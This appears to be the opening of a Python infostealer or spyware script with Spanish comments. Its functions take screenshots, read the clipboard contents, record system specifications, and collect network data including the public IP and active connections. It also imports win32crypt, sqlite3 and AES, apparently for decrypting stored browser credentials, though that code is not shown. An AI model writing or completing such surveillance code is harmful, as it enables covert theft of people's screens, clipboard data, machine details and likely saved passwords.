import logging
import pyautogui
import time
import win32clipboard
import platform
import psutil
import socket
import requests
from datetime import datetime
import os
import sqlite3
import base64
import json
import win32crypt
import requests
from Crypto.Cipher import AES

def registro_errores(mensaje):
    logging.basicConfig(
        filename="errors.log",
        level=logging.ERROR,
        format="%(asctime)s - %(message)s"
    )
    
    logging.error(mensaje)
    
#Obtener el portapapeles
def capture_screenshot():
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    screenshot_path = f"screenshot_{timestamp}.png"
    pyautogui.screenshot(screenshot_path)
    return screenshot_path

#Obtener el portapapeles
def get_clipboard_content():
    win32clipboard.OpenClipboard()
    try:
        return win32clipboard.GetClipboardData()
    except Exception as e:
        registro_errores(f"Error retrieving clipboard content: {e}")
        return ""
    finally:
        win32clipboard.CloseClipboard()

#Funcion para obtener las especifiaciones del sistema 
def obtener_especificaciones_sistema():
    resultado = (
    f"=== ESPECIFICACIONES DEL SISTEMA ===\n"
    f"Sistema operativo: | {platform.system()} | {platform.release()} | {platform.version()} |\n"
    f"Arquitectura: {platform.architecture()[0]}\n"
    f"Procesador: {platform.processor()}\n"
    f"Núcleos del CPU: {psutil.cpu_count(logical=True)}\n"
    f"RAM total: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB\n"
    f"Tiempo de actividad del sistema: {datetime.fromtimestamp(psutil.boot_time())}\n"
    f"Hora actual: {datetime.now()}\n"
)
    return resultado
#Funcion para obtener la informacion de red de la maquina
def obtener_informacion_red():
    resultado = "=== INFORMACIÓN DE RED ===\n"
    hostname = socket.gethostname()
    ip_privada = socket.gethostbyname(hostname)
    resultado += f"IP privada: {ip_privada}\n"
    
    try:
        ip_publica = requests.get("https://api.ipify.org").text
        resultado += f"IP pública: {ip_publica}\n"
    except requests.RequestException as e:
        resultado += f"No se pudo obtener la IP pública: {e}\n"
    
    resultado += f"Nombre del host: {hostname}\n"
    resultado += "\n=== CONEXIONES DE RED ===\n"
    
    conexiones = psutil.net_connections()
    for conexion in conexiones[:5]:
        laddr = f"{conexion.laddr.ip}:{conexion.laddr.port}" if conexion.laddr else "N/A"
        raddr = f"{conexion.raddr.ip}:{conexion.raddr.port}" if conexion.raddr else "N/A"
        resultado += f"  {laddr} -> {raddr} (Estado: {conexion.status})\n"
    
    return resultado

